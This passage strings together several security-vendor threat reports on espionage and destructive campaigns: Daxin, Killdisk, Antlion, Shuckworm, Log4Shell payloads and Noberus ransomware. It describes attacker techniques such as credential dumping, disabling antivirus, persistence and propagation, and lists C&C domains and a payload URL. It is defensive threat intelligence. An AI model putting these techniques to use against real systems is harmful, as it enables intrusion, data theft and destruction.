TCP/IP stack to connect to the TCP server listed in the selected entry. Once connected, Daxin starts the initiator side protocol. If the peer computer is infected with Daxin, this results in opening a new encrypted communication channel. An updated copy of the original message is then sent over this new channel, where the position of the next node to use is incremented. The process then repeats for the remaining nodes on the list. While it is not uncommon for attackers’ communications to make multiple hops across networks in order to get around firewalls and generally avoid raising suspicions, this is usually done step-by-step, such that each hop requires a separate action. However, in the case of Daxin, this process is a single operation, suggesting the malware is designed for attacks on well-guarded networks, where attackers may need to periodically reconnect into compromised computers. The Symantec Threat Hunter team has identified Daxin deployments in government organizations as well as entities in the telecommunications, transportation, and manufacturing sectors. Several of these victims were identified with the assistance of the PwC Threat Intelligence team. While the most recent known attacks involving Daxin occurred in November 2021, the earliest known sample of the malware dates from 2013 and included all of the advanced features seen in the most recent variants, with a large part of the codebase having already been fully developed. This suggests that the attackers were already well established by 2013, with Daxin features reflecting their expertise at that time. We believe that before commencing development of Daxin, the attackers were already experimenting for some time with the techniques that become part of Daxin. An older piece of malware – Backdoor. Zala (aka Exforel) – contained a number of common features but did not have many of Daxin’s advanced capabilities. Daxin appears to build on Zala’s networking techniques, reusing a significant amount of distinctive code and even sharing certain magic constants. This is in addition to a certain public library used to perform hooking that is also common between some variants of Daxin and Zala. The extensive sharing indicates that Daxin designers at least had access to Zala’s codebase. We believe that both malware families were used by the same actor, which became active no later than 2009. There are several examples of attacks where tools known to be associated with Chinese espionage actors have been observed along with what we believe to be variants of Daxin. In a November 2019 attack against an information technology company, the attackers used a single PsExec session to first attempt to deploy Daxin before then resorting to Trojan. Owprox. Owprox is associated with the China-linked Slug (aka Owlproxy). In May 2020, malicious activity involving both Backdoor. Daxin and Trojan. Owprox occurred on a single computer belonging to another organizations, a technology company. In a July 2020 attack against a military target, the attackers made two unsuccessful attempts to deploy a suspicious driver. When these attempts failed, the attackers resorted to different malware instead, a variant of Trojan. Emulov. Symantec did not obtain either of the two suspicious drivers used in this attack. However, very strong similarities between this attack and earlier activity in which Daxin was used suggests that it is highly likely the attackers attempted to deploy Daxin before falling back on the other malware. In summary, Daxin includes some of the most complex features we have seen in a highly probable China-linked malware campaign. We will publish follow-up blogs over the coming days with more detailed technical analysis and other insights from our research and collaborations.

    "text": "UPDATE February 24, 2022, 13:42:This blog has been updated with details about ransomware being used as a possible decoy during some wiper attacks. UPDATE February 25, 2022, 17:00:This blog has been updated with details on how a known Microsoft SQL Server vulnerability (CVE-2021-1636) was exploited in at least one attack. A new form of disk-wiping malware (Trojan. Killdisk) was used to attack organizations in Ukraine shortly before the launch of a Russian invasion this morning (February 24). Symantec, a division ofBroadcom Software, has also found evidence of wiper attacks against machines in Lithuania. Sectors targeted included organizations in the financial, defense, aviation, and IT services sectors. Trojan. Killdisk comes in the form of an executable file, which is signed by a certificate issued to Hermetica Digital Ltd. It contains 32-bit and 64-bit driver files which are compressed by the Lempel-Ziv algorithm stored in their resource section. The driver files are signed by a certificate issued to EaseUS Partition Master. The malware will drop the corresponding file according to the operating system (OS) version of the infected system. Driver file names are generated using the Process ID of the wiper Once run, the wiper will damage the Master Boot Record (MBR) of the infected computer, rendering it inoperable. The wiper does not appear to have any additional functionality beyond its destructive capabilities. Initial indications suggest that the attacks may have been in preparation for some time. Temporal evidence points to potentially related malicious activity beginning as early as November 2021. However, we are continuing to review and verify findings. In the case of an attack against one organization in Ukraine, the attackers appear to have gained access to the network on December 23, 2021, via malicious SMB activity against a Microsoft Exchange Server. This was immediately followed by credential theft. A web shell was also installed on January 16, before the wiper was deployed on February 23. An organization in Lithuania was compromised from at least November 12, 2021, onwards. It appears the attackers may have leveraged a Tomcat exploit in order to execute a PowerShell command. The decoded PowerShell was used to download a JPEG file from an internal server, on the victim’s network. A minute later, the attackers created a scheduled task to execute a suspicious ‘postgresql.exe’ file, weekly on a Wednesday, specifically at 11:05 local-time. The attackers then ran this scheduled task to execute the task. Nine minutes later, the attackers modified the scheduled task to execute the same postgres.exe file at 09:30 local-time instead. Beginning on February 22, Symantec observed the file ‘postgresql.exe’ being executed and used to perform the following: Following this activity, PowerShell was used to dump credentials from the compromised machine: Later, following the above activity, several unknown PowerShell scripts were executed. Five minutes later, the wiper (Trojan. KillDisk) was deployed. The attackers appear to have used an exploit of a known vulnerability in Microsoft SQL Server (CVE-2021-1636) in order to compromise at least one of the targeted organisations. In an attack against an organization in Ukraine, the following process lineage was used to execute the “whoami” command on November 11 2021: The next day, the same process lineage was responsible for executing the following PowerShell command: The organization was running an unpatched version of Microsoft SQL Server. In several attacks Symantec has investigated to date, ransomware was also deployed against affected organizations at the same time as the wiper. As with the wiper, scheduled tasks were used to deploy the ransomware. File names used by the ransomware included client.exe, cdir.exe, cname.exe, connh.exe, and intpub.exe. It appears likely that the ransomware was used as a decoy or distraction from the wiper attacks. This has some similarities to the earlier WhisperGate wiper attacks against Ukraine, where the wiper was disguised as ransomware. With an invasion now underway, there remains a high likelihood of further cyber attacks against Ukraine and other countries in the region. Symantec’s Threat Hunter Team will continue to actively monitor the situation and post updates to this blog if new information becomes available. Symantec Endpoint products will detect and block this threat using the following signatures: For the latest protection updates, please visit theSymantec Protection Bulletin.

    "text": "Chinese state-backed advanced persistent threat (APT) group Antlion has been targeting financial institutions in Taiwan in a persistent campaign over the course of at least 18 months. The attackers deployed a custom backdoor we have called xPack on compromised systems, which gave them extensive access to victim machines. The backdoor allowed the attackers to run WMI commands remotely, while there is also evidence that they leveraged EternalBlue exploits in the backdoor. The attackers appeared to have the ability to interact with SMB shares, and it's possible that they used mounted shares over SMB to transfer files from attacker-controlled infrastructure. There is also evidence that the attackers were able to browse the web through the backdoor, likely using it as a proxy to mask their IP address. The goal of this campaign appears to have been espionage, as we saw the attackers exfiltrating data and staging data for exfiltration from infected networks. As well as the attack on the financial institution outlined in thecase study below, Antlion compromised the networks of at least two other organizations in Taiwan, including another financial organization and a manufacturing company. The activity the group carried out on those networks was largely similar to the activity that is detailed in the case study, with the xPack backdoor frequently deployed and a lot of evidence of credential dumping. In the manufacturing target, also, we see the attackers attempting to download malicious files via SMB shares. The attackers also spent a significant amount of time on both these targeted networks, spending close to 250 days on the financial organization and around 175 days on the manufacturing organization. Symantec, a division of Broadcom, cannot state with certainty what the initial infection vector used by the attackers in this campaign was, though in one instance they were seen utilizing the MSSQL service to execute system commands, which indicates that the most likely infection vector was exploitation of a web application or service. However, Antlion are also known to have previously used malicious emails to gain initial access to victim networks. The main custom backdoor used by Antlion in this campaign was the xPack backdoor, which is a custom . NET loader that decrypts (AES), loads, and executes accompanying .bin files. Its decryption password is provided as a command-line argument (Base64 encoded string), and xPack is intended to be run as a standalone application or as a service (xPackSvc variant). The xPack malware and its associated payload seems to be used for initial access; it appears that xPack was predominantly used to execute system commands, drop subsequent malware and tools, and stage data for exfiltration. The attackers also used a custom keylogger and three custom loaders. The attackers also used a custom SMB session enumeration tool (NetSessionEnum), a custom bind/reverse file transfer tool named ENCODE MMC, and a Kerberos golden ticket tool based on Mimikatz. The attackers also used a variety of off-the-shelf tools, as well as leveraging living-off-the-land tools such as PowerShell, WMIC, ProcDump, LSASS, and PsExec. The legitimate AnyDesk tool was also abused by the attackers for remote access in one of the victim organizations. The attackers were also observed leveraging exploits such as CVE-2019-1458 for privilege escalation and remote scheduled tasks to execute their backdoor. CVE-2019-1458 is an elevation-of-privilege vulnerability that occurs in Windows when the Win32k component fails to properly handle objects in memory. Legitimate versions of WinRAR appear to have been exploited by the attackers for data exfiltration, while there is also evidence of data exfiltration via PowerShell, specifically using the BitsTransfer module to initiate an upload to attacker-controlled infrastructure. There is also evidence that the attackers likely automated the data collection process via batch scripts, while there is also evidence of instances where data was likely staged for further exfiltration, though it was not actually observed being exfiltrated from the network. In these instances, it appears the attackers were interested in collecting information from software pertaining to business contacts, investments, and smart card readers. The attackers spent a significant amount of time on victims’ networks, and deployed both custom and off-the-shelf malware. In one financial sector victim in Taiwan the attackers spent almost nine months on the victim network. The first suspicious activity on this victim network occurred in December 2020 when WMIC was used to execute two commands: The first command was used to list the computer name, description of processes, executable path, and process ID. The output was written to a suspicious file named htable.xsl under the wbem directory. The second command was used to collect information about the system, which was written out to the same file (htable.xsl). Information collected included: Five minutes after those commands were issued, WMIC was used to dump credentials: The commands listed above were all executed via Antlion’s custom xPack backdoor. Several days later, during the Christmas holiday period, the attackers returned over a period of a few days and executed the xPack backdoor again. They also executed an unknown VBS script via PsExec multiple times: On December 28, the attackers used xPack to launch a command prompt to dump credentials from several machines within the compromised organization with the following commands: Over the following couple of weeks, the attackers continued to return intermittently to launch the xPack backdoor or to dump credentials via the registry. Then, following a few weeks of inactivity, they become active on the infected network once again. The attackers used the xPack backdoor to launch a command prompt to execute the following commands: The above commands were used to firstly change the code page to 950, which is the Windows code page for Traditional Chinese. The attackers then executed 'query user' to list any logged-in users on the system, as well as running ‘tasklist’ to get a list of all the running processes on the system. They also tried to discover what processes were running, before listing all contents of the Desktop directory and the Users directory. After this, the attackers dumped credentials again via the registry. The attackers returned to the network a couple of weeks later and carried out largely the same activity. The attackers remained active on the network for March, April, and May 2021, intermittently returning to launch their xPack backdoor or dump credentials from the registry. Dumping credentials appears to be a main focus of the attackers, with them likely using these credentials to move laterally across the network to identify machines of interest from which they can exfiltrate data. The last activity on this network, after a gap of three months, occurred in August 2021, when the attackers returned and listed all available shares. They then dumped credentials from the registry and proceeded to collect account, group, and workstation configuration information. They then dumped credentials from the registry once again. This was the last activity seen on this network. Antlion is believed to have been involved in espionage activities since at least 2011, and this recent activity shows that it is still an actor to be aware of more than 10 years after it first appeared. The length of time that Antlion was able to spend on victim networks is notable, with the group able to spend several months on victim networks, affording plenty of time to seek out and exfiltrate potentially sensitive information from infected organizations. The targeting of Taiwan is perhaps unsurprising given we know Chinese state-backed groups tend to be interested in organizations in that region.

    "text": "The Russia-linked Shuckworm group (aka Gamaredon, Armageddon) is continuing to conduct cyber-espionage attacks against targets in Ukraine. Over the course of recent months, Symantec’s Threat Hunter Team, a part ofBroadcom Software, has found evidence of attempted attacks against a number of organizations in the country. Active since at least 2013, Shuckworm specializes in cyber-espionage campaigns mainly against entities in Ukraine. The group is known to use phishing emails to distribute either freely available remote access tools, including Remote Manipulator System (RMS) and UltraVNC, or customized malware called Pterodo/Pteranodon to targets. Arecent reportpublished by The Security Service of Ukraine (SSU) noted that Shuckworm’s attacks have grown in sophistication in recent times, with attackers now using living-off-the-land tools to steal credentials and move laterally on victim networks. Recent activity seen by Symantec is consistent with that documented by SSU. Symantec observed Shuckworm activity on an organization in Ukraine, which began on July 14, 2021 and continued until August 18, 2021. The attack chain began with a malicious document, likely sent via a phishing email, which was opened by the user of the infected machine. The following is a breakdown of the attackers’ activity on the compromised computer. At 08:48 (local-time), a suspicious Word document is opened on the machine. Just five minutes after the document is opened, a suspicious command is also executed to launch a malicious VBS file (depended.lnk). This file is a known custom backdoor leveraged by Shuckworm (aka Pterodo). The backdoor is used to download and execute CSIDL_PROFILE\\searches\\depended.exe (94a78d5dce553832d61b59e0dda9ef2c33c10634ba4af3acb7fb7cf43be17a5b) from hxxp://92.242.62.131/wordpress.php?is=[REDACTED]. Two additional VBS scripts are observed being executed via depended.exe: A scheduled task is then created to likely ensure persistence between system reboots and to execute the dropped script. This ensures the VBS file deep-thoughted.ppt is executed every 10 minutes: Later, the attackers are observed executing an HTA file hosted on a remote server by abusing mshta.exe via depended.exe. The Mshta utility can execute Microsoft HTML Application (HTA) files and can be abused to bypass application control solutions. Since mshta.exe executes outside of Internet Explorer's security context, it also bypasses browser security settings. At the same time, a new variant of Pterodo is installed via depended.exe. Similarly to before, two additional scheduled tasks are created: The attackers continue to install variants of their backdoor and execute commands via scripts to ensure persistence: Directly after this, it appears the attackers test connectivity to a new C&C server via ping.exe: Once the connection is confirmed to be active, the attackers proceed to download another variant of their Pterodo backdoor and begin using the new C&C to download additional scripts and tools, as well as creating scheduled tasks to run every few minutes. At this point, the attackers cease activity. However, we continue to see commands being executed from the scheduled tasks for the remainder of July 14. At 05:28, the attackers return, and several additional variants of Pterodo are executed via CSIDL_COMMON_VIDEO\\planeta.exe (1ea3881d5d03214d6b7e37fb7b10221ef51782080a24cc3e275f42a3c1ea99c1). The attackers are then observed executing commands via planeta.exe: The above flushdns command may indicate that the attackers have updated the DNS records for their C&Cs, as we observed some of their tools use hard-coded domains. In this particular instance, the flushdns command was executed shortly before the attackers attempted to install additional backdoors that leveraged the same C&C. Later, another variant ofPterodo (deep-sided.fly) was executed and was used to download and execute a new file called deerskin.exe (ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29). This file is a dropper for a VNC client. When executed, it pings google DNS (8.8.8.8) to test internet connectivity, then proceeds to drop a VNC client and establishes a connection to a remote C&C server controlled by the attackers: Two such files have been identified that perform the same actions: This VNC client appears to be the ultimate payload for this attack. Between July 29 and August 18 activity continued whereby we observed the attackers deploying multiple variants of their custom VBS backdoor along with executing VBS scripts and creating scheduled tasks similar to the ones detailed above. After August 18, no further suspicious activity was observed on this machine. During the course of this investigation, specifically post VNC client installation, a number of documents were opened from various locations on the compromised machine. It is unclear if this was legitimate user activity or the activity of the attackers attempting to collect and exfiltrate sensitive information. Titles of the documents accessed ranged from job descriptions to sensitive information pertaining to the targeted organization. Symantec investigations uncovered a total of seven files used by Shuckworm in recent attacks. All seven files are 7-zip SFX self-extracting binaries, a format used previously in Shuckworm attacks. Upon execution, the file named descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) drops a VBS file which, in turn, drops a second VBS file in the following locations: It then creates the following task: The file deerbrook.ppt (b46e872375b3c910fb589ab75bf130f7e276c4bcd913705a140ac76d9d373c9e) VBS file contacts a command-and-control (C&C) server at deep-pitched.enarto.ru. If the C&C server is available, a HTTP POST request is sent to download a payload, which is saved in the %USERPROFILE% folder as deep-sunken.tmp then renamed to deep-sunken.exe and executed. The binary is then deleted. Upon execution, the file deep-sunken.exe (02c41bddd087522ce60f9376e499dcee6259853dcb50ddad70cb3ef8dd77c200) drops the following files on the compromised computer: It then creates the following task: It then connects to a C&C server (arianat.ru) to download another payload using wget: The baby.dat file is a VBS file that executes baby.cmd, which then downloads and executes the payload from the C&C server. The vb_baby.vbs file renames the downloaded payload from baby.php to backed.exe. The downloaded payload (backed.exe) could not be retrieved. However, the following files were also obtained during our investigation: The file z4z05jn4.egf.exe (fd9a9dd9c73088d1ffdea85540ee671d8abb6b5ab37d66a760b2350951c784d0) is similar to the previous file (deep-sunken.exe) but with different folders, file names, and C&C server (iruto.ru). Once executed, the file defiant.exe (a20e38bacc979a5aa18f1954df1a2c0558ba23cdc1503af0ad1021c330f1e455) drops a VBS file in the following locations: It then creates the following task: The dropped file deep-versed.nls (817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc) downloads a payload from a C&C server (deep-toned.chehalo.ru) and saves it as deep-green.exe in the following location: The file deep-green.exe (1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f) contains an UltraVNC binary, which upon execution connects to a repeater (mucoris.ru:5612) using the following command line: UltraVNC is an open-source remote-administration/remote-desktop-software utility. A second file named deep-green.exe (f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa) contain a Process Explorer (procexp) binary. Process Explorer is a freeware task manager and system monitor for Microsoft Windows. A third file called deep-green.exe (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a) is similar to descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) just with different file names and C&C server (deer-lick.chehalo.ru). The fourth and final file named deep-green.exe (d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7) drops a VBS file in the following location: It then creates the following task: The MediaConvertor.dat file searches for removable drives and creates a .lnk file with the following command: Analysis of the many indicators of compromise (IOCs) uncovered during our investigations have revealed the following patterns, which may be of use when defending networks from Shuckworm attacks: According to aNovember 2021 reportfrom the SSU, since 2014 the Shuckworm group has been responsible for over 5,000 attacks against more than 1,500 Ukrainian government systems. As evidenced by Symantec’s recent investigations into attempted Shuckworm attacks against a number of organizations in Ukraine, this activity shows little sign of abating.

    "text": "From the evolving ransomware ecosystem to attacks against critical infrastructure, Symantec looks back over thecyber-security trends that shaped 2021. A new whitepaper from Symantec, a division ofBroadcom Software, takes a look back at the some of the major threats that shaped the threat landscape during 2021. Ransomware was arguably the most significant threat facing organizations in 2021, with some ransomware operators departing the scene, new ones entering the fold, and business models and tactics being refined to make targeted ransomware more lucrative than ever. However, ransomware wasn’t the only threat, with supply chain attacks, an increase in attackers exploiting vulnerabilities in public-facing applications, and attacks against critical infrastructure also shaping the threat landscape in 2021. Ransomware, or more precisely, targeted ransomware, was the most dominant threat making headlines throughout 2021. Ransomware gangs moved towards targeting entities with a broad network of downstream users. These upstream entities included large software developers and organizations involved in critical infrastructure, as seen in the Kaseya and Colonial Pipeline attacks. Targeting managed service providers (MSPs) also gave attackers the opportunity to infect potentially thousands of victims by compromising just one. While as in previous years, the total number of ransomware attacks detected and blocked by Symantec in 2021 continues to trend downwards, this doesn’t mean ransomware activity is becoming less of a threat. This downward trend is due to a significant decrease in relatively unsophisticated, indiscriminate ransomware attacks and threat actors shifting their focus to large organizations where they can cause more disruption and demand higher ransom amounts. The number of these targeted ransomware attacks rose from around 80 in January 2020 to more than 200 in September 2021. This increase in targeted ransomware attacks is partly fueled by two relatively recent developments: the rise of so-called initial access brokers (IABs), threat actors that sell access to compromised networks to the highest bidder, which in recent times has become targeted ransomware gangs; and a rise in ransomware-as-a-service (RaaS), a subscription-based model that lets individuals or gangs known as affiliates use already-developed ransomware threats in their attacks. The RaaS model greatly increases the number of adversaries an organization faces, with multiple attackers now attempting to deliver the same ransomware, but using different tactics, techniques, and procedures (TTPs). Due to the growth in the RaaS market, affiliates now have the option to migrate to another ransomware should their current one shut down. In addition,Symantec has observedaffiliates using two different strains of ransomware in a very short space of time and, in some cases, during the same attack. This suggests that some affiliates have enough of a reputation to not be locked in to an exclusive agreement with one ransomware operator. While as in previous years, the total number of ransomware attacks detected and blocked by Symantec in 2021 continues to trend downwards, this doesn’t mean ransomware activity is becoming less of a threat. Botnets are now also playing a key role in ransomware attacks, with many older financial fraud botnets having been repurposed to spread ransomware. In some cases, it is the same threat actor behind both the ransomware and the botnet. For example, Trickbot is believed to be controlled by the Miner group (aka Wizard Spider) which is also linked to both the Ryuk and Conti ransomware. Another takeaway from the year concerning ransomware included operators targeting industries that were hardest hit by the COVID-19 pandemic. A prime example of this was theattack against Ireland’s national health service, the Health Service Executive, by the Conti (aka Miner, Wizard Spider) ransomware operators. Last year also saw the REvil (aka Leafroller, Sodinokibi) ransomware’s infrastructure compromised by law enforcement, whichgained control of at least some of REvil’s servers. However, as with previous efforts to halt the gang’s activity, REvil is likely to reappear in some form following the most recent takedown effort. In 2021, targeted ransomware groups also began threatening victims in order to prevent them from sharing details of attacks with media or ransomware negotiating firms. Both the Conti and Grief ransomware gangs said that they would publish stolen victim data or delete decryption keys if transcripts or screenshots of ransom negotiations were publicly shared. The announcement was likely prompted by a growing number of media reports containing details of ransom negotiations. Other threat groups also employed similar tactics, including Ragnar Locker and a new ransomware threat called Yanluowang, which wasuncovered by Symantec’s Threat Hunter Team. Software supply chain attacks, due to their potential to disrupt large sections of society and business, remain a concern for governments and businesses around the world. Two significant supply chain attacks in the headlines from last year included the SolarWinds hack and the Kaseya attack. While the SolarWinds attack occurred in late 2020 it continued to make waves well into 2021. The attackers responsible for the attack, the Russia-backed Nobelium (aka Hagensia) group, has remained active. A new backdoor threat (Tomiris) likely developed by Nobelium was uncovered in September. The malware has similarities to the SUNSHUTTLE second-stage malware used by Nobelium in the SolarWinds attack. While another post-exploitation backdoor (FoggyWeb) was also linked to Nobelium. The malware is designed to steal sensitive data from compromised Active Directory Federation Services (AD FS) servers. The attack against IT management software maker Kaseya, which was carried out by the REvil ransomware operators, impacted multiple managed service providers (MSPs) that used the company’s software. While Kaseya reported that approximately 60 of their customers were impacted by the attack, those customers were MSPs with numerous customers themselves. The estimated number of organizations compromised as a result of the supply chain attack was 1,500. The attack was carried out during the U. S. July 4 holiday weekend, likely in an attempt to have the attack go unnoticed for as long as possible due to many employees being on leave. This is a tactic that is increasingly being adopted by threat actors. While the Kaseya and SolarWinds attacks are the most significant, they are by no means the only supply chain attacks in recent times. According toa reportfrom the Identity Theft Resource Center (ITRC), supply chain attacks are increasing, with 793,000 more individuals being affected by such attacks in the first three quarters of 2021 than in the entire 12 months of 2020. Last year saw an increase in attackers exploiting vulnerabilities in public-facing applications in order to gain access to organizations’ networks. While in some cases attackers are focusing on zero-day bugs, more frequently they are looking towards recently patched vulnerabilities and the hunt for unpatched systems. A notable example of this was the critical vulnerabilities in Microsoft Exchange Server, collectively known as ProxyLogon. The flaws were patched in early March 2021, with Microsoft saying at the time that the bugs were being exploited by an advanced persistent threat (APT) group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, shortly after the ProxyLogon vulnerabilities were disclosed, other threat actors began exploiting them. This quick adoption was also highlighted when another string of vulnerabilities in Microsoft Exchange Server, dubbed ProxyShell, were publicly revealed in August 2021. Exploit attempts targeting these bugs began immediately, with Symantec data showing more than 200,000 exploit attempts targeting this set of vulnerabilities in August 2021 alone. Other vulnerabilities in public-facing applications that were frequently exploited by threat actors in 2021 include flaws in VPN products from Pulse Secure (CVE 2019-11510), Fortinet (CVE-2018-13379), and SonicWall (CVE-2021-20016), and vulnerabilities in Accellion’s File Transfer Appliance (FTA) software (CVE-2021-27101, CVE-2021-27102, CVE-2021-27103, and CVE-2021-27104). Cyber-attacks against critical national infrastructure (CNI) can be some of the most impactful as they can potentially affect everyone in society. This was highlighted in May 2021, when the Colonial Pipeline, the largest petroleum pipeline in the U. S., suffered a ransomware attack that impacted equipment managing the pipeline. The attack was carried out by the Russia-based DarkSide ransomware gang. While the ransom was paid just hours after the attack took place, decryption was slow and the pipeline’s operation was halted, causing fuel shortages, price increases, and panic buying across a number of U. S. states. The Colonial Pipeline attack was not an isolated incident, with news also emerging in July 2021 that Chinese state-sponsored threat actors hadtargeted 23 U. S. oil and gas pipeline operatorsin attack campaigns between 2011 and 2013. U. S. officials announced that the aim of the actors behind the attacks was to “help China develop cyber attack capabilities against U. S. pipelines to physically damage pipelines or disrupt pipeline operations.” Attacks against CNI show no signs of stopping, with the number of network-based detections related to attacks targeting CNI trending upward (Figure 3). These attacks are blocked by Symantec’s Intrusion Prevention System (IPS) technologies. Malicious activity blocked on the network saw a decline after a peak in July 2021, however, overall the numbers are trending upward. In terms of regions that see the most activity targeting the networks of CNI organizations, the U. S. is bounds ahead of others on the list with 69% of all activity seen there.

    "text": "Apache Log4j is a Java-based logging utility. The library’s main role is to log information related to security and performance to make error debugging easier and to enable applications to run smoothly. The library is part of the Apache Logging Services, a project of the Apache Software Foundation. Log4j has been making headlines recently after the public disclosure of three critical vulnerabilities in the utility which can lead to remote code execution (CVE-2021-44228 and CVE-2021-45046) and denial of service (CVE-2021-45105). The initial remote code execution vulnerability (CVE-2021-44228) has been dubbed Log4Shell and has dominated cyber-security news ever since it was publicly disclosed on December 9. The vulnerability has been exploited to deploy a plethora of payloads like coin miners, Dridex malware, and even ransomware such as Conti. Symantec, a division ofBroadcom Software, has observed numerous variations in attack requests primarily aimed at evading detection. Some sample attack requests can be seen in Table 1. Attackers are predominantly using the LDAP and RMI protocols to download malicious payloads. We have also recorded vulnerability scans using protocols such as IIOP, DNS, HTTP, NIS etc. Muhstik Botnet -We have observed attackers downloading malicious Java class files as a part of Log4shell exploitation. The malicious class file downloads a shell file with the content shown in Figure 1. The shell script attempts to download Executable and Linkable Format (ELF) files and execute them, which leads to the installation of the Muhstik botnet. XMRig miner -We have also observed attackers installing the XMRig cryptocurrency miner as a part of post-exploitation activity related to Log4shell exploitation. The miner is downloaded via a simple PowerShell command (Figure 2). The miner is executed with the command shown in Figure 3. Malicious class file backdoor -We have also seen attacks attempt to download a malicious Java class file that acts as a backdoor. The class file has code to listen for and execute commands from the attacker (Figure 4). Reverse Bash shell –Attackers were alsoobserved deploying reverse shells on vulnerable machines (Figure 5). Other publicly reported payloads include the Khonsari and Conti ransomware threats, the Orcus remote access Trojan (RAT), and the Dridex malware, among others. For the period between December 9 (when the first Log4j vulnerability was disclosed) and December 21, Symantec’s Intrusion Prevention System (IPS) blocked more than 93 million Log4Shell related exploitation attempts on more than 270,000 unique machines. During the same time frame, IPS blocked more than 18 million Log4Shell related exploitation attempts on more than 60,000 unique server machines. The majority of Log4Shell attacks blocked by Symantec were against machines located in the U. S. and the United Kingdom, followed by Singapore, India, and Australia. Meanwhile, the majority of attacks exploiting the Log4j vulnerabilities seem to originate from devices located in the U. S. and Germany, followed by Russia, the United Kingdom, and China. Machine learning-based DCS provides multi-layered protection for Windows, Linux Server workloads, and container applications for this vulnerability: Siddhesh works for the Intrusion Prevention System (IPS) team in Symantec's Security Technology and Response (STAR) division.

    "text": "Symantec’s Threat Hunter Team has additional technical information to share on the new ALPHV/BlackCat ransomware that was first published about last week, and which we have been tracking for several weeks. Symantec, a division ofBroadcom Software, tracks this ransomware as Ransom. Noberus and our researchers first spotted it on a victim organization on November 18, 2021, with three variants of Noberus deployed by the attackers over the course of that attack. This would appear to show that this ransomware was active earlier than was previously reported, withMalwareHunterTeam having toldBleepingComputerthey first saw this ransomware on November 21. Noberus is an interesting ransomware because it is coded in Rust, and this is the first time we have seen a professional ransomware strain that has been used in real-world attacks coded in this programming language. Noberus appears to carry out the now-typical double extortion ransomware attacks where they first steal information from victim networks before encrypting files. Noberus adds the .sykffle extension to encrypted files. This blog contains information about the attack chain we observed in one victim organization, as well as technical details about the operation of this ransomware. The first suspicious activity observed by Symantec occurred on a victim’s network on November 3, approximately two weeks before Noberus was deployed. During this time, suspicious network activity was observed. Later on November 18, shortly before Noberus was deployed, ConnectWise was also executed. A few hours later, Noberus was deployed, indicating that the attackers may have leveraged access to ConnectWise to deploy their payload. While it is a legitimate tool, ConnectWise has frequentlybeen exploited by ransomware attackers in recent timesto gain access to victim networks. On November 3, suspicious Server Message Block (SMB) requests occurred on the earliest machine to get infected on the victim network. This was followed by remote Local Security Authority (LSA) registry dump attempts from a remote machine on the network. This suggests the attackers may have compromised another machine on the network where we didn't have visibility, or they could also have added a new machine to the domain from which they were launching attacks to dump credentials. On the same day, PsExec was also executed from a remote machine to launch a command prompt. The attackers used this to disable a restricted remote administration feature known as ‘RestrictedAdmin mode’ via the Windows registry. This effectively disables safeguards guarding against 'pass the hash' attacks targeting Remote Desktop Protocol (RDP), allowing the attackers to attempt to gain higher administrative privileges. The next activity occurred on November 18 when PsExec was used to run multiple PowerShell commands to effectively disable Windows Defender. Specifically, the PowerShell command used added *.exe to an exclusion list for AV scanning, and this command was executed across the entire organization. Later on November 18, the first instance of Noberus ransomware was deployed via PsExec. In order for Noberus to execute properly, it requires a specific ‘access-token’. This acts as a unique key, which is used to distinguish the victim when visiting the Noberus operators’ Tor site. The following similar commands were observed being executed: In the above, PsExec is launched with the following specific command line arguments: For the second command above, the ‘no-net’ command line argument instructs Noberus not to process network shares during propagation. See the Technical Details below for a full list of support command line arguments and their description. In all the samples of Noberus that we have access to, the victim’s administrative credentials are embedded as part of the configuration block, showing that this attack was specifically targeted at this victim. Once Noberus is executed, the ransomware first deletes any available shadow copies, which is typical in ransomware attacks, in order to stop the organization from restoring encrypted files. Noberus then runs commands to collect system information via WMIC, in order to collect Universally Unique Identifiers (UUIDs) from each machine. These are then used to generate the ‘access token’ that makes up part of the unique Tor address victims are instructed to visit. We also saw a fsutil command being executed by Noberus. Fsutil performs tasks that are related to file allocation table (FAT) and NTFS file systems. In this incident, the attacker is specifically modifying the SymLink Evaluation behavior to modify the type of symbolic links that can be created on the system. Symbolic links create a file in your directory that acts as a shortcut to another file or folder. This is used to follow various types of shortcuts (local and remote), likely to ensure Noberus can follow these shortcuts and perform encryption. As part of the propagation mechanism, Noberus attempts to mount hidden partitions. It then attempts to spread via the ‘net use’ command. The embedded administrative credentials are used as part of this mechanism along with PsExec, which is embedded in a compressed form within Noberus. During the attack, the attackers were also seen modifying the maximum limit of concurrent requests machines could make via PsExec. This was likely to aid in the propagation of Noberus across the network. At this stage, Noberus proceeds to terminate a set of pre-defined processes and begin the encryption process. At some point during the attack the organization became aware of the infection and deployed remediation software. However, despite this, it appears the attackers were able to return and deploy another variant of their ransomware to other systems on the network. In total, three variants of this ransomware were identified during this intrusion, leading to at least 261 machines on the network becoming infected with Noberus. A technical analysis of Noberus itself found that a lot of its behavior is consistent with the activity we saw on the victim network. The first step it takes after being deployed on victim networks is to remove shadow copies: It then issues a command to collect Universally Unique Identifiers (UUIDs) from infected machines. The UUID and parameter ‘access token’ are then used to generate \"ACCESS_KEY\". Noberus then enables the remote-to-local and remote-to-remote symbolic link evaluations. It then attempts to mount a hidden partition, by issuing the following commands: Noberus then cleans up the Recycle Bin and attempts to propagate via network share. It looks for available shares by using the ‘net use’ command or NetShareEnum function. Embedded administrative credentials may then be used for propagation via network share. Noberus also attempts to propagate via PsExec. The PsExec module is embedded in the Noberus code (see Figure 1). It is compressed with zlib (Figure 2). The decompressed PsExec file is a legitimate Microsoft-signed clean file (Figure 3). Once it has gained access to a machine, Noberus then proceeds to kill the following processes and services: It also excludes certain directories, filenames, and file extensions from the encryption process, such as: Noberus then proceeds to encrypt files using either AES or ChaCha20 encryption. The private key for encrypted machines appears to be generated randomly. It appears that Noberus generates a random number using BCryptGenRandom and calculates each byte with the string shown inFigure 4. Files that have been encrypted have .sykffle appended to the end of their filename, in the following format: Noberus then creates a ransomware note, creating a .txt and a .png file that are displayed to victims, with the following filenames: The 